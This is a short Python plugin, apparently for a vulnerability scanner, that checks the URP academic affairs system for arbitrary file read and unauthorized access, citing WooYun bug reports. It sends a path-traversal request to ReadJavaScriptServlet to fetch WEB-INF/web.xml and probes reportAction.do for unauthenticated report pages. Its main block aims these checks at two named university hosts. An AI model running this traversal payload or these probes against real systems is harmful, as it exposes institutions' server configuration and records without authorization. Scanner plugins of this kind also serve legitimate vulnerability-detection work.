#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:URP综合教务系统任意文件读取and未授权访问 （可能有重复）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-054350,http://www.wooyun.org/bugs/wooyun-2013-025424,http://www.wooyun.org/bugs/wooyun-2014-051947

def assign(service,arg):
    if service=="urp":
        return True,arg 


def  audit(arg):
    #文件读取
    url=arg+"servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<?xml" in res and '<web-app>' in res:
        security_hole(url)
    # #越权访问1
    # url=arg+"reportFiles/cj/cj_zwcjd.jsp"
    # code,head,res,errcode,_=curl.curl2(url)
    
    # if code==200 and 'report1_saveAs_frame' in res:
    #     security_hole(url)
    #越权访问2
    url=arg+"reportAction.do"
    code,head,res,errcode,_=curl.curl2(url)
    
    if code==200 and 'reportFiles' in res and 'reportLeftAction.do' in res:
        security_hole(url)
        
if __name__=="__main__":
    from dummy import *
    
    audit(assign('urp','http://jwgl.mzlxy.cn/')[1])
    audit(assign('urp','http://urp.npumd.cn/')[1])